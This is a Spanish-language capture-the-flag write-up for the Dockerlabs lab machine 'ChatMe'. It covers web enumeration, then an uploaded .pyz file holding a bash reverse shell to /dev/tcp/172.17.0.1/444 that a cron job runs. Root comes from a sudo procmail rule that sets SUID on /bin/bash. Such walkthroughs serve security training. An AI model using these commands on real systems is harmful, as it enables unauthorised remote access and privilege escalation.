
# Writeup Template: Maquina `[ ChatMe ]`

- Tags: #ChatMe
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina ChatMe](https://mega.nz/file/TA8ViDiK#2nR-Xh0Ge7yJfAlXAxihzb6ykJeZylwGaP2k5tDMR3g)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x chatme.zip
sudo bash auto_deploy.sh chatme.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```

Revisando el codigo fuente tenemos un dominio:
```bash
<a href="[http://chat.chatme.dl" class="btn1">
```

agregamos los dominos a nuestro archivo: **/etc/hosts**
```bash
172.17.0.2 chatme.dl chat.chatme.dl
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://chatme.dl/
http://chatme.dl/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[172.17.0.2], JQuery[3.4.1], Meta-Author[ChatMe Team], Script, Title[ChatMe - The Best Online Chat Solution], X-UA-Compatible[IE=edge], nginx[1.24.0]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 chatme.dl # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://chatme.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada critico

### Descubrimiento de Archivos
```bash
gobuster dir -u http://chatme.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,java,pl
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 7579]
/images               (Status: 301) [Size: 178] [--> http://chatme.dl/images/]
/css                  (Status: 301) [Size: 178] [--> http://chatme.dl/css/]
/js                   (Status: 301) [Size: 178] [--> http://chatme.dl/js/]
/fonts                (Status: 301) [Size: 178] [--> http://chatme.dl/fonts/]
```

Ahora vamos a filtrar por archivos con esta herramienta:
```bash
feroxbuster -u http://chat.chatme.dl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,html,js,py
```

Tenemos lo siguiente:
```bash
200      GET       71l      157w     1891c http://chat.chatme.dl/login.php
301      GET        7l       12w      178c http://chat.chatme.dl/uploads => http://chat.chatme.dl/uploads/
200      GET      178l      430w     5769c http://chat.chatme.dl/index2.php
200      GET        1l       15w      147c http://chat.chatme.dl/upload.php
```

---
## Explotacion de Vulnerabilidades

### Intrusion
Primero nos ponemos en modo escucha:
```bash
nc -nlvp 444
```

### Vector de Ataque
Sabiendo que el usuario **System** interactua con los archivos que nosotros subamos, Asi que nos aprovecharemos de esto para ejecutar un archivo maliciosos que nos otorgue una **bash** interactiva:
La extension de archivo que usaremos es: **( pyz )** el cual contendra las siguiente instruccion:
```pyz
import os

os.system("bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/444 <&1'")
```

Subimos el archivo, Ahora solo esperamos a que el usuario **system** ejecute el archivo para obtener una **shell**
```bash
nc -nlvp 444
listening on [any] 444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 49012
bash: cannot set terminal process group (784): Inappropriate ioctl for device
bash: no job control in this shell
system@ccb1126996fc:~$ 
```

---

## Escalada de Privilegios

###### Usuario `[ System ]`:
Listando los permisos de este usuario:
```bash
sudo -l

User system may run the following commands on ccb1126996fc:
    (ALL : ALL) NOPASSWD: /usr/bin/procmail # Tenemos una via potencial de migrar a root
```

Tenemos un archivo en la siguiente ruta:
```bash
/tmp/crontab.Z4q2tT/crontab
```

Que al parecer es el que carga nuestros archivos que previamente habiamos subido desde el chat:
```bash
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/3 * * * * echo '' > /var/www/chat/chatdata.txt && echo '<b>System</b> cleared the chat<br>' >> /var/www/chat/chatdata.txt
*/0 * * * * /usr/bin/python3 /usr/local/appchat/uploads/*.pyz
```

Ahora si listamos las tareas cron para este usuario: **System**
```bash
crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/3 * * * * echo '' > /var/www/chat/chatdata.txt && echo '<b>System</b> cleared the chat<br>' >> /var/www/chat/chatdata.txt
* * * * * /usr/bin/sh /usr/local/appchat/.scripts/run.sh
```

Revisando en esta ruta:
```bash
/usr/local/appchat/.scripts/run.sh
```

El contenido del script **run.sh** esta ejecutando lo que tenga el directorio uploads:
```bash
DIRECTORY="/usr/local/appchat/uploads"

for file in "$DIRECTORY"/*.pyz; do
    if [ -f "$file" ]; then
        /usr/bin/python3 "$file"
    else
        echo ""
    fi
done
```

Si listamos los permisos de ese archivo vemos que el propietario es: **system**
```bash
ls -l
total 4
-rwxr-xr-x 1 system www-data 173 Sep 18  2024 run.sh
```

Ahora para lograr explotar el binario **procmail** crearemos su archivo de configuracion para que ejecute instrucciones que nosostros definamos:
**.procmailrc**
```bash
touch .procmailrc
```

Ahora metemos esta instruccion:
```bash
:0

| chmod u+s /bin/bash
```

Explotamos el privilegio:
```bash
echo ' ' | sudo -u root /usr/bin/procmail -m .procmailrc
```

Ahora solo nos conectanos
```bash
# Comando para escalar al usuario: ( root )
bash -p
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
bash-5.2# whoami
root
```

---